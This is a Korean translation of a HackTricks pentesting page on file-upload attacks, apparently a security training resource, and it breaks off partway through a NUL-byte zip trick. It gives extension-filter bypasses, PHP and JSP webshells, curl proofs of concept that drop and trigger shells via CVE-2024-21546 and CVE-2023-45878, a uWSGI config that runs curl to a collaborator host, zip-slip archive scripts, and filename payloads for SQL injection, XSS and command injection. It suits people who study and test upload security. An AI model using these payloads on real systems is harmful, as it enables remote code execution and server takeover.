# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

다른 유용한 확장자:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 파일 확장자 검사 우회

1. 적용되는 경우, **이전 확장자들**을 **확인**하세요. 또한 몇몇 **대문자**를 사용해 테스트해보세요: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 유효한 확장자를 **추가하는 것**을 확인하세요 (이전 확장자들도 사용):_
- _file.png.php_
- _file.png.Php5_
3. 끝에 **특수 문자**를 추가해보세요. Burp를 사용해 모든 **ASCII** 및 **Unicode** 문자를 **bruteforce**할 수 있습니다. (_참고: 이전에 언급한 **extensions**도 시도할 수 있습니다_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. **extension parser**를 속여 보호를 우회해보세요 — 예를 들어 **확장자 이중화**나 확장자 사이에 **junk 데이터**(**null** bytes) 삽입 같은 기법을 사용합니다. _더 나은 payload 작성을 위해 이전 확장자들을 사용할 수도 있습니다._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 체크에 **추가 확장자 레이어**를 더해보세요:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **실행 확장자**를 유효한 확장자 앞에 두고 서버가 잘못 구성되었기를 기대해보세요. (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. **Windows**에서 **NTFS alternate data stream (ADS)** 활용. 이 경우 금지된 확장자 뒤와 허용된 확장자 앞에 콜론 ":" 문자가 삽입됩니다. 결과적으로 서버에 **금지된 확장자를 가진 빈 파일**이 생성될 수 있습니다(예: "file.asax:.jpg"). 이 파일은 이후 short filename 같은 다른 기법으로 편집될 수 있습니다. "**::$data**” 패턴을 사용하면 비어있지 않은 파일도 생성할 수 있습니다. 따라서 이 패턴 뒤에 점 문자를 추가하는 것도 추가 제한을 우회하는 데 유용할 수 있습니다(예: "file.asp::$data.")
8. 파일명 길이 제한을 깨보세요. 유효한 확장자가 잘리고 악성 PHP가 남습니다. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

일부 upload handler는 저장된 파일명에서 끝의 점 문자(trailing dot)를 잘라내거나 정규화합니다. UniSharp의 Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 이전 버전에서는 다음과 같이 extension 검증을 우회할 수 있습니다:

- PNG의 `\x89PNG\r\n\x1a\n` 같은 유효한 이미지 MIME과 magic header를 사용합니다.
- 업로드된 파일 이름을 PHP 확장자 뒤에 점을 붙여서 지정합니다. 예: `shell.php.`
- 서버가 끝의 점을 제거하여 `shell.php`로 저장하고, 이 파일이 웹으로 서빙되는 디렉터리에 위치하면 실행됩니다(기본 public storage 예: `/storage/files/`).

간단한 PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
그런 다음 저장된 경로를 호출하세요 (Laravel + LFM에서 일반적):
```
GET /storage/files/0xdf.php?cmd=id
```
### Content-Type, Magic Number, Compression & Resizing 우회

- **Content-Type** 검사를 우회하려면 **Content-Type** **header**의 **value**를 다음으로 설정하세요: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** 검사는 파일의 맨 앞에 실제 이미지의 **bytes**를 추가하여 우회할 수 있습니다 (_file_ 명령을 혼동시킵니다). 또는 **metadata** 안에 쉘을 삽입하세요:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 또는 페이로드를 이미지에 직접 **삽입**할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 이미지에 **compression**이 적용되는 경우(예: [PHP-GD](https://www.php.net/manual/fr/book.image.php) 같은 표준 PHP 라이브러리를 사용하는 경우), 이전 기술들은 효과가 없을 수 있습니다. 이때는 **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 웹 페이지가 예를 들어 PHP-GD 함수 `imagecopyresized` 또는 `imagecopyresampled`를 사용해 **image를 resizing**할 수도 있습니다. 이 경우 **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD의 `thumbnailImage` 함수로 이미지 크기 조정 시에도 페이로드가 **생존하도록 하는** 다른 기법이 있습니다. 또는 **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 확인할 기타 트릭

- 이미 업로드된 파일의 이름(확장자)을 변경할 수 있는 취약점을 찾으세요.
- Local File Inclusion 취약점을 찾아 백도어를 실행하세요.
- **가능한 정보 유출**:
1. 동일한 이름으로 **여러 번(동시에)** 같은 파일을 업로드하세요.
2. 이미 존재하는 **파일** 또는 **폴더**의 **이름**으로 파일을 업로드하세요.
3. 파일 이름을 `"."`, `".."`, 또는 `"…"`로 업로드하세요. 예를 들어, Apache가 **Windows**에서 애플리케이션이 업로드된 파일을 "/www/uploads/" 디렉터리에 저장하면, "." 파일명은 "/www/" 디렉터리에 "uploads”라는 파일을 생성할 수 있습니다.
4. **NTFS**에서 쉽게 삭제되지 않는 파일 이름(예: **"…:.jpg"**)을 업로드하세요. (Windows)
5. 이름에 `|<>*?”` 같은 **유효하지 않은 문자**를 포함한 파일을 **Windows**에 업로드하세요. (Windows)
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9 같은 **예약(금지)된 이름**을 사용해 Windows에 파일을 업로드하세요.
- 또한 실행 가능한 파일(.exe)이나 덜 의심스러운 .html 파일을 업로드해 피해자가 실수로 열었을 때 코드가 **실행되도록** 시도해 보세요.

### 특수 확장자 트릭

PHP 서버에 파일을 업로드하려는 경우, [코드 실행을 위한 **.htaccess** 트릭을 확인하세요](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
ASP 서버에 파일을 업로드하려는 경우, [코드 실행을 위한 **.config** 트릭을 확인하세요](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` 파일은 java의 `.jar`와 유사하지만 php용이며, php로 실행하거나 스크립트에 포함하여 **php 파일처럼 사용할 수 있습니다**.

`.inc` 확장자는 종종 import 용도로만 사용되는 php 파일에 사용되므로, 어떤 경우에는 이 확장자가 **실행되도록 허용**되어 있을 수 있습니다.

## Jetty RCE

Jetty 서버에 XML 파일을 업로드할 수 있다면 [새로운 *.xml 및 *.war가 자동으로 처리되기 때문에 RCE를 얻을 수 있습니다](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서 아래 이미지에 설명된 대로 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하면 쉘을 기대할 수 있습니다!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## uWSGI RCE

이 취약점에 대한 자세한 내용은 원문 리서치를 확인하세요: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있는 경우 uWSGI 서버에서 악용될 수 있습니다. uWSGI 구성 파일은 특정한 문법으로 "magic" 변수, 플레이스홀더 및 연산자를 포함합니다. 특히 `@(filename)`처럼 사용되는 '@' 연산자는 파일의 내용을 포함하도록 설계되어 있습니다. uWSGI에서 지원되는 여러 스킴 중 "exec" 스킴은 프로세스의 표준 출력에서 데이터를 읽을 수 있게 해 매우 강력하며, `.ini` 구성 파일이 처리될 때 이 기능을 Remote Command Execution 또는 Arbitrary File Write/Read에 악용할 수 있습니다.

다음은 다양한 스킴을 보여주는 악의적인 `uwsgi.ini` 파일의 예를 고려해 보세요:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
구성 파일을 파싱하는 동안 payload가 실행됩니다. 구성이 활성화되어 파싱되려면 uWSGI 프로세스가 재시작되어야 합니다(충돌 후 또는 Denial of Service 공격으로 인해) 또는 파일이 auto-reload로 설정되어야 합니다. auto-reload 기능이 활성화된 경우 변경을 감지하면 지정된 간격으로 파일을 다시 로드합니다.

uWSGI의 구성 파일 파싱이 느슨하다는 점을 이해하는 것이 중요합니다. 특히, 여기서 논의된 payload는 바이너리 파일(예: image 또는 PDF) 안에 삽입될 수 있어 잠재적 악용 범위를 더욱 넓힙니다.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS의 인증되지 않은 endpoint는 웹 루트 내에 arbitrary file write를 허용하며, PHP 파일을 업로드해 pre-auth RCE로 이어집니다. 취약 버전: 25.0.01까지(포함).

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (서버는 type/name을 무시하고 꼬리 부분을 base64 디코드합니다)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
최소한의 webshell을 업로드하여 명령을 실행:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
참고:
- 핸들러는 `;` 및 `,` 로 분할한 후 `base64_decode($_POST["img"])` 를 수행하고, 확장자/타입을 검증하지 않은 채 바이트를 `$absolutePath . '/' . $_POST['path']` 에 씁니다.
- 결과적으로 실행되는 코드는 웹 서비스 사용자 권한으로 실행됩니다(예: XAMPP Apache on Windows).

이 버그에 대한 참조로는 usd HeroLab advisory와 NVD 항목이 포함됩니다. 아래의 References 섹션을 참조하세요.

## **wget File Upload/SSRF Trick**

경우에 따라 서버가 **`wget`** 을 사용해 **파일을 다운로드** 하고, 당신이 **URL** 을 **지정할 수** 있는 상황을 발견할 수 있습니다. 이러한 경우 코드가 다운로드된 파일의 확장자가 허용 목록(whitelist)에 있는지 확인하여 허용된 파일만 다운로드되도록 할 수 있습니다. 그러나, **이 검사는 우회될 수 있습니다.**\
**linux**에서 **filename**의 **최대** 길이는 **255**이지만, **wget**은 파일명을 **236**자로 잘라버립니다. 당신은 **"A"*232+".php"+".gif"** 라는 파일을 **다운로드** 할 수 있으며, 이 파일명은 **체크를 우회** 합니다(이 예에서 **".gif"** 는 **유효한** 확장자입니다). 하지만 `wget`은 파일명을 **"A"*232+".php"** 로 **변경** 합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### NTFS junctions (Windows)를 이용한 업로드 디렉터리 탈출

(이 공격을 수행하려면 해당 Windows 머신에 로컬 액세스가 필요합니다) Windows에서 업로드가 사용자별 하위 폴더(예: C:\Windows\Tasks\Uploads\<id>\) 아래에 저장되고 해당 하위 폴더의 생성/삭제를 제어할 수 있다면, 이를 민감한 위치(예: the webroot)를 가리키는 directory junction으로 교체할 수 있습니다. 이후 업로드된 파일은 대상 경로에 기록되며, 대상이 서버 측 코드를 해석하는 경우 코드 실행을 가능하게 합니다.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
노트
- mklink /J creates an NTFS directory junction (reparse point). 웹 서버의 계정은 junction을 따라가야 하며 목적지에 대한 쓰기 권한이 있어야 합니다.
- 이는 임의의 파일 쓰기를 리디렉션합니다; 목적지가 스크립트(PHP/ASP)를 실행하면 RCE가 됩니다.
- 대응책: writable upload roots를 공격자가 제어할 수 있도록 C:\Windows\Tasks 아래 또는 유사한 위치에 두지 말 것; junction 생성 차단; 서버‑사이드에서 확장자 검증; 업로드를 별도 볼륨에 저장하거나 deny‑execute ACLs를 적용.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

일부 upload/ingest handlers는 원시 요청 바디를 사용자 제어 query 파라미터로 구성된 파일시스템 경로에 기록합니다. 핸들러가 Content-Encoding: gzip을 지원하고 destination 경로를 정규화/검증하지 않으면, directory traversal과 gzipped 페이로드를 결합하여 웹으로 서빙되는 디렉터리에 임의 바이트를 기록하고 RCE를 얻을 수 있습니다(예: Tomcat의 webapps 아래에 JSP를 배치).

일반적인 익스플로잇 흐름:
- 서버‑사이드 페이로드(예: minimal JSP webshell)를 준비하고 바이트를 gzip으로 압축합니다.
- 경로 파라미터(예: token)에 의도된 폴더를 벗어나는 traversal을 포함시키고 file이 저장할 파일명을 가리키는 POST를 보냅니다. Content-Type: application/octet-stream 및 Content-Encoding: gzip을 설정하고, 바디에는 압축된 페이로드를 넣습니다.
- 작성된 파일로 접속하여 실행을 트리거합니다.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
그런 다음 트리거:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
노트
- 설치 환경에 따라 대상 경로는 달라집니다(예: /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). JSP를 실행하는 웹 노출 폴더라면 어떤 것이든 작동합니다.
- Burp Suite’s Hackvertor extension은 페이로드로부터 올바른 gzip body를 생성할 수 있습니다.
- 이것은 순수한 pre-auth arbitrary file write → RCE 패턴이며, multipart parsing에 의존하지 않습니다.

완화 방법
- 업로드 대상은 서버 측에서 결정하세요; 클라이언트의 경로 조각을 절대 신뢰하지 마세요.
- 해석된 경로를 정규화하고, 허용된 기본 디렉토리 내에 머물도록 강제하세요.
- 업로드 파일은 실행 불가능한 볼륨에 저장하고, 쓰기 가능한 경로에서 스크립트 실행을 금지하세요.

## 도구

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) 는 file upload 메커니즘 테스트에서 Pentesters 및 Bug Hunters를 지원하도록 설계된 강력한 도구입니다. 여러 bug bounty 기법을 활용해 취약점 식별 및 익스플로잇 과정을 단순화하고 웹 애플리케이션의 철저한 평가를 보장합니다.

### Corrupting upload indices with snprintf quirks (historical)

일부 레거시 upload 핸들러는 `snprintf()` 또는 유사한 함수를 사용해 단일 파일 업로드로부터 multi-file 배열을 구성하는데, 이를 교묘히 속여 `_FILES` 구조를 위조하도록 만들 수 있습니다. `snprintf()` 동작의 불일치와 잘림(truncation) 때문에 정교하게 조작된 단일 업로드가 서버 측에서 여러 인덱스화된 파일처럼 보일 수 있어, 엄격한 형태를 가정하는 로직(e.g., multi-file upload로 처리하여 안전하지 않은 분기를 택하는 경우)을 혼란시킵니다. 오늘날에는 틈새 사례지만 이 “index corruption” 패턴은 가끔 CTFs나 오래된 코드베이스에서 다시 등장합니다.

## From File upload to other vulnerabilities

- **filename**을 `../../../tmp/lol.png`로 설정하고 **path traversal**을 시도하세요
- **filename**을 `sleep(10)-- -.jpg`로 설정하면 **SQL injection**을 달성할 수 있습니다
- **filename**을 `<svg onload=alert(document.domain)>`로 설정하면 **XSS**를 달성할 수 있습니다
- **filename**을 `; sleep 10;`로 설정하여 일부 command injection을 테스트하세요 (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 만약 웹 서버에 특정 URL에서 이미지를 가져오도록 지시할 수 있다면, [SSRF](../ssrf-server-side-request-forgery/index.html)를 악용해볼 수 있습니다. 이 이미지가 어떤 공개 사이트에 저장될 경우, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)의 URL을 지정하여 모든 방문자의 정보를 훔칠 수도 있습니다.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 특수 제작된 PDF로 XSS: 다음 페이지는 [**inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md)를 설명합니다. PDF를 업로드할 수 있다면 주어진 지침에 따라 임의의 JS를 실행하는 PDF를 준비할 수 있습니다.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- 파일 업로드 시 **size limit**이 있는지 확인하세요

다음은 업로드로 달성할 수 있는 상위 10가지입니다 (출처: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

다른 파일 유형은 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 를 참고하세요.

## Zip/Tar File Automatically decompressed Upload

서버 내부에서 압축 해제될 ZIP을 업로드할 수 있다면, 다음 두 가지를 시도할 수 있습니다:

### Symlink

다른 파일에 대한 심볼릭 링크를 포함한 링크를 업로드하면, 압축 해제된 파일에 접근할 때 링크된 파일에 접근하게 됩니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에 압축 해제

압축 해제 과정에서 디렉토리에 파일이 예기치 않게 생성되는 문제는 심각합니다. 이 구조가 악성 파일 업로드를 통한 OS 수준의 명령 실행으로부터 보호할 것이라는 초반의 가정과 달리, ZIP 아카이브 포맷의 계층적 압축 지원과 디렉토리 트래버설 기능을 악용할 수 있습니다. 이를 통해 공격자는 압축 해제 기능을 조작하여 제한을 우회하고 안전한 업로드 디렉토리 밖으로 벗어날 수 있습니다.

이러한 파일을 제작하기 위한 자동화된 익스플로잇은 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)에서 이용할 수 있습니다. 유틸리티 사용 예시는 다음과 같습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한, **symlink trick with evilarc**는 하나의 옵션입니다. 목표가 `/flag.txt` 같은 파일을 타깃으로 하는 것이라면, 해당 파일로의 symlink를 시스템에 생성해야 합니다. 이는 evilarc가 동작 중 오류를 겪지 않도록 보장합니다.

아래는 악성 zip 파일을 생성하기 위해 사용된 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

자세한 내용은 **원문 게시물을 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP 코드는 `$_REQUEST` 변수로 전달된 명령을 실행하도록 작성된다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 여러 파일을 생성하고 이 파일들을 포함하는 zip 아카이브를 만든다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 내부의 파일 이름을 vi 또는 헥스 편집기로 변경하여 디렉토리 트래버스를 위해 "xxA"를 "../"로 바꾼다.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

백엔드가 PHP의 ZipArchive로 ZIP 엔트리를 검증하지만, 추출 시 파일 시스템에 raw names로 기록하면, 파일명 필드에 NUL (0x00)을 삽입해 허용되지 않는 확장자를 스머글할 수 있다. ZipArchive는 엔트리 이름을 C‑string으로 취급해 첫 번째 NUL에서 잘라내지만, 파일시스템은 NUL 뒤의 내용을 포함한 전체 이름을 기록한다.

High-level flow:
- 정상적인 컨테이너 파일(예: 유효한 PDF)을 준비하고, magic/MIME가 PDF로 유지되도록 스트림에 작은 PHP 스텁을 임베드한다.
- 파일 이름을 `shell.php..pdf`처럼 정하고, zip으로 압축한 다음 ZIP 로컬 헤더와 중앙 디렉터리 파일명을 헥스 편집하여 `.php` 다음의 첫 번째 `.`를 `0x00`으로 교체하면 `shell.php\x00.pdf`가 된다.
- ZipArchive에 의존하는 검증기는 `shell.php .pdf`로 '보여' 허용하고, 추출기는 `shell.php`를 디스크에 기록해 업로드 폴더가 실행 가능하면 RCE로 이어진다.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
